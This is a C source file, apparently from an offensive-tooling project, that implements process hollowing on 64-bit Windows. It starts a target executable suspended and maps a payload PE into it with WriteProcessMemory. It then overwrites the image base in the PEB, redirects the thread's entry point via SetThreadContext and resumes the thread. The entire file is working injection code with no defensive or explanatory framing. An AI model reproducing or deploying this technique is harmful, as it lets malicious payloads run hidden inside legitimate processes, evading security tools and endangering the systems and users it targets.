#include "ProcessHollowing.h"

//\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\

BOOL CreateSuspendedProcess
(
	_In_ LPCWSTR TargetProcessPath,
	_Out_ HANDLE* ProcessHandle,
	_Out_ HANDLE* ThreadHandle
)
{

	STARTUPINFOW		si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	RtlSecureZeroMemory(&si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFOW);

	if (!CreateProcessW(TargetProcessPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		WARN("Failed To Create Process: %ls", TargetProcessPath);
		PRINT_ERROR("CreateProcessW");
		return FALSE; // no point of continuing if we can't even create the process
	}

	INFO("[0x%p] Process Handle", pi.hProcess);
	INFO("\t\t\t\\___ [%ld] ProcessId", pi.dwProcessId);
	INFO("[0x%p] Thread Handle", pi.hThread);
	INFO("\t\t\t\\___ [%ld] ThreadId", pi.dwThreadId);

	*ProcessHandle = pi.hProcess;
	*ThreadHandle = pi.hThread;

	return TRUE;

}

//\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\

BOOL ReadTargetFileW
(
	_In_ LPCWSTR PeName,
	_Out_ LPVOID* lpBuffer
)
{

	HANDLE	hFile				= NULL;
	BOOL	State				= TRUE;
	DWORD	lpNumberOfBytesRead = 0;
	DWORD	NumberOfBytesRead	= 0;

	if (!PeName || !lpBuffer)
		return FALSE;

	if (!(hFile = CreateFileW(PeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) || hFile == INVALID_HANDLE_VALUE)
	{
		PRINT_ERROR("CreateFileA");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Current File Handle", hFile);

	if (!(NumberOfBytesRead = GetFileSize(hFile, NULL)) || NumberOfBytesRead == INVALID_FILE_SIZE)
	{
		PRINT_ERROR("GetFileSize");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[%ld] Current File Size", NumberOfBytesRead);

	if (!(*lpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, NumberOfBytesRead)) || *lpBuffer == NULL)
	{
		PRINT_ERROR("HeapAlloc");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[%ld] Allocated Bytes to Buffer", NumberOfBytesRead);

	if (!ReadFile(hFile, *lpBuffer, NumberOfBytesRead, &lpNumberOfBytesRead, NULL))
	{
		PRINT_ERROR("ReadFile");
		State = FALSE; goto _END_FUNC;
	}

	OKAY("Successfully Read File!");

_END_FUNC:

	if (hFile)
		CloseHandle(hFile);

	return State;

}

//\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\

BOOL ChangeMemoryProtection
(
	_In_ HANDLE ProcessHandle,
	_In_ PVOID TargetBaseAddress,
	_In_ PIMAGE_NT_HEADERS pImgNt
)
{


	PIMAGE_SECTION_HEADER pImgSec = IMAGE_FIRST_SECTION(pImgNt);

	for (int i = 0; i < pImgNt->FileHeader.NumberOfSections; i++)
	{

		ULONG ulProtection = 0;
		ULONG ulOldProt = 0;

		if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			ulProtection = PAGE_EXECUTE;

		if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_READ)
			ulProtection = PAGE_READONLY;

		if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			ulProtection = PAGE_WRITECOPY;

		if ((pImgSec[i].Characteristics & IMAGE_SCN_MEM_READ) && (pImgSec[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			ulProtection = PAGE_READWRITE;

		if ((pImgSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSec[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			ulProtection = PAGE_EXECUTE_WRITECOPY;

		if ((pImgSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSec[i].Characteristics & IMAGE_SCN_MEM_READ))
			ulProtection = PAGE_EXECUTE_READ;

		if ((pImgSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSec[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSec[i].Characteristics & IMAGE_SCN_MEM_READ))
			ulProtection = PAGE_EXECUTE_READWRITE;

		PVOID BaseAddress = (((PBYTE)TargetBaseAddress + pImgSec[i].VirtualAddress));
		SIZE_T Size = pImgSec[i].SizeOfRawData;

		if (!VirtualProtectEx(ProcessHandle, BaseAddress, Size, ulProtection, &ulOldProt))
		{
			WARN("Failed To Change Memory Protection!");
			PRINT_ERROR("VirtualProtectEx");
			return FALSE;
		}

	}

	return TRUE;

}

//\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\

// not required, but still being added
BOOL RelocSections
(
	_In_ DWORD RVA,
	_In_ PVOID ImageBase,
	_In_ DWORD_PTR Delta
)
{

	PIMAGE_BASE_RELOCATION	Reloc = NULL;
	PBASE_RELOCATION_ENTRY	RelocEntry = NULL;
	DWORD					Size = 0;

	if (RVA)
	{
		Reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)ImageBase + RVA);

		while (Reloc->VirtualAddress)
		{

			Size = (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			RelocEntry = (PBASE_RELOCATION_ENTRY)(Reloc + 1);

			for (DWORD i = 0; i < Size; i++)
			{

				if (RelocEntry[i].Type == IMAGE_REL_BASED_DIR64)
				{
					ULONGLONG* PatchedAddress = (ULONGLONG*)((PBYTE)ImageBase + Reloc->VirtualAddress + RelocEntry[i].Offset);
					*PatchedAddress += (ULONGLONG)Delta;
				}

				else if (RelocEntry[i].Type == IMAGE_REL_BASED_HIGHLOW)
				{
					DWORD* PatchedAddress = (DWORD*)((PBYTE)ImageBase + Reloc->VirtualAddress + RelocEntry[i].Offset);
					*PatchedAddress += (DWORD)Delta;
				}

				else if (RelocEntry[i].Type == IMAGE_REL_BASED_HIGH)
				{
					WORD* PatchedAddress = (WORD*)((PBYTE)ImageBase + Reloc->VirtualAddress + RelocEntry[i].Offset);
					*PatchedAddress += HIWORD(Delta);
				}

				else if (RelocEntry[i].Type == IMAGE_REL_BASED_LOW)
				{
					WORD* PatchedAddress = (WORD*)((PBYTE)ImageBase + Reloc->VirtualAddress + RelocEntry[i].Offset);
					*PatchedAddress += LOWORD(Delta);
				}

				else if (RelocEntry[i].Type == IMAGE_REL_BASED_ABSOLUTE)
				{
					break;
				}

			}
			Reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)Reloc + Reloc->SizeOfBlock);

		}

	}

	return TRUE;

}

//\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\

BOOL PerformHollowExecution
(
	_In_ HANDLE ProcessHandle,
	_In_ HANDLE ThreadHandle,
	_In_ LPVOID TargetPayloadBuffer
)
{

	PIMAGE_NT_HEADERS64		pImageNtHeader			= NULL;
	PIMAGE_SECTION_HEADER	pImageSectionHeader		= NULL;
	PIMAGE_DATA_DIRECTORY	pEntryBaseRelocDataDir	= NULL;

	BOOL					State					= TRUE;
	DWORD_PTR				Delta					= 0;
	DWORD					OldProtection			= 0;
	DWORD					RelocationOffset		= 0;
	DWORD					RelocRva				= 0;

	SIZE_T					NumberOfBytesWritten	= 0;
	PVOID					PayloadBuffer			= NULL;
	PVOID					SectionBaseAddress		= NULL;
	PVOID					SectionBuffer			= NULL;

	CONTEXT ThreadContext = { 0 };
	RtlSecureZeroMemory(&ThreadContext, sizeof(CONTEXT));
	ThreadContext.ContextFlags = CONTEXT_ALL;

	pImageNtHeader = (PIMAGE_NT_HEADERS64)((ULONG_PTR)TargetPayloadBuffer + ((PIMAGE_DOS_HEADER)TargetPayloadBuffer)->e_lfanew);
	if (pImageNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		INFO("Nt Signature Does Not Match!");
		return FALSE; // no point of continuing
	}

	if (!(PayloadBuffer = VirtualAllocEx(ProcessHandle, (LPVOID)pImageNtHeader->OptionalHeader.ImageBase, (SIZE_T)pImageNtHeader->OptionalHeader.SizeOfImage, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)) || PayloadBuffer == NULL)
	{
		WARN("Failed To Allocated Payload Image Base!");
		PRINT_ERROR("VirtualAllocEx");
		State = FALSE; goto _END_FUNC;
	}

	pEntryBaseRelocDataDir = &pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (PayloadBuffer != (LPVOID)pImageNtHeader->OptionalHeader.ImageBase)
	{
		WARN("Image Base Does Not Match!"); 
		INFO("Performing Relocations!");
		// technically, this isn't required, but on the off chance that they do not match, it is better to try and perform relocations.
		Delta = ((ULONG_PTR)PayloadBuffer - pImageNtHeader->OptionalHeader.ImageBase);
		RelocRva = pEntryBaseRelocDataDir->VirtualAddress;
		RelocSections(RelocRva, PayloadBuffer, Delta);
	}

	OKAY("[0x%p] Image Base Successfully Matched Payload Buffer!", PayloadBuffer);

	if (!WriteProcessMemory(ProcessHandle, PayloadBuffer, TargetPayloadBuffer, pImageNtHeader->OptionalHeader.SizeOfHeaders, &NumberOfBytesWritten))
	{
		WARN("Failed To Write Payload Buffer!");
		PRINT_ERROR("WriteProcessMemory");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Successfully Wrote %zu Bytes to Process Memory!", NumberOfBytesWritten);

	pImageSectionHeader = IMAGE_FIRST_SECTION(pImageNtHeader);
	for (DWORD i = 0; i < pImageNtHeader->FileHeader.NumberOfSections; i++)
	{

		SectionBaseAddress = (PVOID)((PBYTE)PayloadBuffer + pImageSectionHeader[i].VirtualAddress);
		SectionBuffer = (PVOID)((PBYTE)TargetPayloadBuffer + pImageSectionHeader[i].PointerToRawData);

		if (!WriteProcessMemory(ProcessHandle, SectionBaseAddress, SectionBuffer, pImageSectionHeader[i].SizeOfRawData, &NumberOfBytesWritten))
		{
			WARN("Failed To Write Process Memory!");
			PRINT_ERROR("WriteProcessMemory");
			State = FALSE; goto _END_FUNC;
		}

		OKAY("Wrote [%s] section --> at [0x%p] Base Address With Size --> [%d]", pImageSectionHeader[i].Name, SectionBaseAddress, pImageSectionHeader[i].SizeOfRawData);

	}

	if (!GetThreadContext(ThreadHandle, &ThreadContext))
	{
		WARN("Failed To Get Thread Context!");
		PRINT_ERROR("GetThreadContext");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Thread Context", ThreadContext);

	if (!WriteProcessMemory(ProcessHandle, (PVOID)(ThreadContext.Rdx + 0x10), &PayloadBuffer, sizeof(PVOID), &NumberOfBytesWritten))
	{
		WARN("Failed To Write RDX + 0x10 to Process Memory!");
		PRINT_ERROR("WriteProcessMemory");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[RCX] --> [0x%p]", (PVOID)ThreadContext.Rcx);

	if (!ChangeMemoryProtection(ProcessHandle, PayloadBuffer, pImageNtHeader))
	{
		WARN("Failed To Change Memory Protections!");
		PRINT_ERROR("ChangeMemoryProtection");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Memory Protections Successfully Changed!");

	ThreadContext.Rcx = (DWORD64)((PBYTE)PayloadBuffer + pImageNtHeader->OptionalHeader.AddressOfEntryPoint);

	if (!SetThreadContext(ThreadHandle, &ThreadContext))
	{
		WARN("Failed To Set Thread Context!");
		PRINT_ERROR("SetThreadContext");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Waiting For Thread To Finish Executing...");

	ResumeThread(ThreadHandle);

	WaitForSingleObject(ThreadHandle, INFINITE);

	OKAY("DONE!");

_END_FUNC:

	if (ThreadHandle)
		CloseHandle(ThreadHandle);

	if (ProcessHandle)
		CloseHandle(ProcessHandle);

	if (PayloadBuffer)
		VirtualFree(PayloadBuffer, 0, MEM_RELEASE);

	return State;

}